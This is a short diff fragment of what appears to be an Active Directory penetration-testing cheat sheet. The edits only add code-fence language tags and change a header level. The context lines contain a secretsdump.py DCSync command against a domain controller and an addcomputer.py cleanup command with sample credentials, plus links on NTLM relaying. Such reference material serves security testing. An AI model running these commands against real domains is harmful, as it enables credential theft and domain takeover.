 6. [DCSync](#dcsync) and win
-```
+```python
 secretsdump.py domain.local/dc01\$@10.10.10.10 -just-dc -hashes :000000000000000
 ```
 
 7. It is always recommended to cleanup the created computer account. _(This requires a privileged account)_
-```
+```python
 addcomputer.py range.net/Administrator:'Password123' -computer-name 'WIN-EAZXIGMWO1T$' -computer-pass 'mi#gKKWFlzxJ' -dc-ip 192.168.86.182 -delete
 ```
 
@@ -1012,7 +1008,8 @@ For the details explanation of the vulnerability (CVE-2022-26923), you may read 
 * [NTLMv1 Downgrade Requirements](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ntlm/ntlmv1-downgrade)
 * https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay
 * https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
-# References
+
+## References
 * https://www.harmj0y.net/
 * https://www.labofapenetrationtester.com/
 * https://ired.team
